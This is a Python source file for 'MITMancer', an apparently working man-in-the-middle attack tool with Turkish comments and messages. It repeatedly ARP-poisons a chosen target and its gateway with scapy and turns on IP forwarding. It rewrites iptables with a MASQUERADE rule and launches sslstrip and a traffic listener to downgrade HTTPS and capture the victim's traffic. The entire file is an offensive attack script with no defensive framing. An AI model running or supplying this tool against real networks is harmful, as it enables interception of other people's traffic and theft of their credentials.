import subprocess
from time import sleep
from colorama import Fore, init
import scapy.all as scapy
from rich.console import Console
from pyfiglet import Figlet
from optparse import OptionParser
import ipaddress
import logging
import os
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

console = Console()
init(autoreset=True)

class MITM():
    network_interfaces = ["eth0", "eth1", "enp0s3", "eno1", "wlan0", "wlan1", "wlp2s0", "wlp3s0"]

    def __init__(self):
        # IP yönlendirme komutu düzeltildi (sudo ile çalıştırılmalı)
        subprocess.call('sudo sysctl -w net.ipv4.ip_forward=1', shell=True)
        self.interface = 'eth0'
        self.target_ip = '0.0.0.0'
        self.gateway_ip = '0.0.0.0'
        self.get_user_input()

    def get_user_input(self):
        parser = OptionParser()
        parser.add_option('-t', '--target', dest='target', help='Target IP adresi')
        parser.add_option('-g', '--gateway', dest='gateway', help='Gateway IP adresi')
        parser.add_option('-i', '--interface', dest='interface', help='Interface')

        options = parser.parse_args()[0]

        def is_validate_ip_address(IP):
            try:
                ipaddress.ip_address(IP)
                return True
            except ValueError:
                return False

        if options.target and is_validate_ip_address(options.target):
            self.target_ip = options.target
        else:
            console.log('[red]Geçerli bir hedef IP giriniz.[/red]')
            exit()

        if options.gateway and is_validate_ip_address(options.gateway):
            self.gateway_ip = options.gateway
        else:
            console.log('[red]Geçerli bir gateway IP giriniz.[/red]')
            exit()

        if options.interface in self.network_interfaces:
            self.interface = options.interface
        else:
            console.log('[red]Interface geçerli değil.[/red]')
            exit()

    def get_mac_address(self, IP):
        arp_request_packet = scapy.ARP(pdst=IP)
        broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        combine_packet = broadcast_packet / arp_request_packet

        mac_address_value = scapy.srp(combine_packet, timeout=3, verbose=False)[0]
        if mac_address_value:
            return mac_address_value[0][1].hwsrc
        else:
            return None

    def arp_poisoning(self, target, spoof_ip):  # Fonksiyon ismi düzeltildi
        target_mac = self.get_mac_address(target)
        if target_mac is None:
            console.log("[red]Hedef MAC adresi alınamadı![/red]")
            exit()

        arp_response_packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(arp_response_packet, verbose=False)

    def reset_poisoning(self, target, spoof_ip):
        target_mac = self.get_mac_address(target)
        spoof_mac = self.get_mac_address(spoof_ip)
        if target_mac and spoof_mac:
            arp_response_packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac,
                                            psrc=spoof_ip, hwsrc=spoof_mac)
            scapy.send(arp_response_packet, verbose=False, count=6)
    def start_sslstrip_and_listener(self):


        subprocess.Popen([
            "xfce4-terminal",
            "--title=SSLStrip",
            "--hold",
            "--command",
            "bash -c 'cd tools/sslstrip && sudo sslstrip; exec bash'"
        ])

        # listener terminali
        subprocess.Popen([
            "xfce4-terminal",
            "--title=Listener",
            "--hold",
            "--command",
            f"bash -c 'cd tools && python3 listener.py -i {self.interface}; exec bash'"
        ])
        
    def mti_attack_function(self):
        # iptables MASQUERADE kuralı eklendi
        subprocess.call(f"sudo iptables -t nat -F", shell=True)
        subprocess.call(f"sudo iptables -F", shell=True)
        subprocess.call(f"sudo iptables -t nat -A POSTROUTING -o {self.interface} -j MASQUERADE", shell=True)
        
        self.start_sslstrip_and_listener()
        
        send_number = 0
        print(Fore.GREEN + f'\rHedef IP: {self.target_ip} MAC: {self.get_mac_address(self.target_ip)}')
        print(Fore.GREEN + f'\rGateway IP: {self.gateway_ip} MAC: {self.get_mac_address(self.gateway_ip)}\n')

        try:
            while True:
                self.arp_poisoning(self.target_ip, self.gateway_ip)
                self.arp_poisoning(self.gateway_ip, self.target_ip)

                send_number += 2
                print(Fore.BLUE + '\rGönderilen paket sayısı: ' + str(send_number), end='')
                sleep(3)

        except KeyboardInterrupt:
            print('\n' + Fore.YELLOW + 'MITM saldırısı durduruluyor...')
            self.reset_poisoning(self.target_ip, self.gateway_ip)
            self.reset_poisoning(self.gateway_ip, self.target_ip)
            subprocess.call(f"sudo iptables -F", shell=True)
            subprocess.call(f"sudo iptables -t nat -F", shell=True)
            print(Fore.GREEN + 'ARP tablosu geri yüklendi.')

if __name__ == '__main__':
    figlet = Figlet(font='slant')
    print(Fore.CYAN + figlet.renderText('MITMancer'))
    sleep(1)
    print(Fore.BLUE + 'Program başlatılıyor...\n')

    mitm = MITM()
    mitm.mti_attack_function()
